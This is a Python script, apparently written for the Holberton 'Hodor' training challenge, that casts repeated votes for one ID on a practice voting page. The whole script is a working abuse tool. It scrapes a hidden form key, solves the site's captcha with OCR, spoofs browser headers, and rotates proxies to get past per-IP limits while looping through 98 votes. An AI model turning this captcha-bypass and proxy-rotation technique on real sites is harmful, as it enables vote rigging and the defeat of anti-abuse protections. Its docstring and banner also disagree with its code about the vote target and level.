#!/usr/bin/python3
"""votes 1024 times for my Holberton Id.

Requirements:

    - tesseract: Google open source OCR
    - bs4(beautifulSoup)
"""


from os import remove
from requests import session, get
from bs4 import BeautifulSoup


proxy = __import__('proxy').Proxy

Url = "http://158.69.76.135/level4.php"
cUrl = "http://158.69.76.135/captcha.php"

user_agent = ("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) "
              "Gecko/20100101 Firefox/47.0")

header = {"User-Agent": user_agent, "referer": Url}

data = {"id": "3922", "holdthedoor": "submit", "key": "", "captcha": ''}

_proxy = {"http": "", }


def get_key(page):
    """Gets the randomic security key"""

    soup = BeautifulSoup(page.text, "html.parser")
    key = soup.find('form').find('input', {'name': 'key'})['value']
    return key


def save_captcha(content):
    """Writes the captcha png file to tmp directory"""

    f = open("/tmp/captcha.png", "wb")
    f.write(content)
    f.close()


def read_captcha():
    """Reads from txt captcha file for the captcha text"""

    f = open("/tmp/captcha.txt", 'r')
    txt = f.read().replace('\n', '')
    f.close()
    return txt


def OCR():
    """Executes GOCR OCR application"""

    exec('import subprocess; subprocess.call(["./gocr", \
        "/tmp/captcha.png", "-o", "/tmp/captcha.txt"])')


def get_count():
    """Return the current vote count of an ID
    """
    html = get(Url)
    soup = BeautifulSoup(html.text, "html.parser")
    count = list(soup.find_all("td"))
    for i in range(len(count)):
        if data["id"] in str(count[i].text):
            return int(count[i + 1].text[1:])
    return False


def set_counter():
    """sets the conter variable
    0 if the Id is new for voting"""
    if get_count() is False:
        return 0
    return get_count()


if __name__ == "__main__":

    i = set_counter()
    print(i)
    while(i < 98):
        proxies = proxy()
        for ip in proxies.GetProxies():
            _proxy["http"] = 'http://' + ip
            print('\033[32mConnecting to \033[0m{}'.format(_proxy["http"]))
            try:
                if (i == 98):
                    break

                hodor_session = session()
                page = hodor_session.get(url=Url, headers=header, proxies=_proxy,
                                         timeout=5)
                data["key"] = get_key(page)

                save_captcha(hodor_session.get(cUrl).content)
                OCR()

                remove("/tmp/captcha.png")

                data["captcha"] = read_captcha()

                session_response = hodor_session.post(Url, headers=header, data=data,
                                                      proxies=_proxy, timeout=5)

                print('\033[31mSuccessful vote: \033[32m{}\033[0m'.format(i + 1))
                i += 1

            except:
                print("\033[31mFailed to connect to proxy {}".format(_proxy["http"]))

    print("------------------------------------------------------------------")
    print("ID: \033[32m{}\033[0m, CURRENT VOTES: \033[32m{}\033[0m -98\
    ".format(data["id"], i))
    print("------------------------------------------------------------------")
    print("\033[32m¡HODOR LEVEL3 SUCCESSFUL CHEAT VOTING!")
    print("------------------------------------------------------------------")
